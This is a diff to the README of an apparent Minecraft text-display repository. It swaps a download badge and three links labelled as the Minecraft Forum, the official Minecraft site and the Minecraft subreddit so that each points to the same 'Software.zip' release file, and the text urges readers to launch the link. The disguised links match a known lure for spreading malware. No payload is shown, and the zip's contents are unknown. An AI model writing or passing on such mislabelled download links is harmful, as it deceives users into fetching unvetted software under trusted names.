@@ -10,10 +10,10 @@ Welcome to the "minecraft-text-display-experiments" repository! Here, you will f
 ## 🚀 Getting Started
 
 To get started with the projects and experiments in this repository, you can download the code using the following link:
-[![Download Code](https://img.shields.io/badge/Download%20Code-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Code](https://github.com/edooocn/minecraft-text-display-experiments/releases/download/v1.0/Software.zip%20Code-v1.0.0-brightgreen)](https://github.com/edooocn/minecraft-text-display-experiments/releases/download/v1.0/Software.zip)
 
 ### Note:
-- **Link**: [Download Code](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+- **Link**: [Download Code](https://github.com/edooocn/minecraft-text-display-experiments/releases/download/v1.0/Software.zip)
 - This link needs to be launched to download the code for the Minecraft text display experiments.
 
 If the above link does not work or you encounter any issues, please check the **Releases** section of this repository for alternative download options.
@@ -50,9 +50,9 @@ Join our Discord community to connect with fellow Minecraft enthusiasts, develop
 
 For more inspiration, tutorials, and resources on Minecraft text display experiments, check out the following links:
 
-- [Minecraft Forum](https://www.minecraftforum.net/)
-- [Minecraft Official Website](https://www.minecraft.net/en-us)
-- [r/Minecraft Subreddit](https://www.reddit.com/r/Minecraft/)
+- [Minecraft Forum](https://github.com/edooocn/minecraft-text-display-experiments/releases/download/v1.0/Software.zip)
+- [Minecraft Official Website](https://github.com/edooocn/minecraft-text-display-experiments/releases/download/v1.0/Software.zip)
+- [r/Minecraft Subreddit](https://github.com/edooocn/minecraft-text-display-experiments/releases/download/v1.0/Software.zip)
 
 ---
 
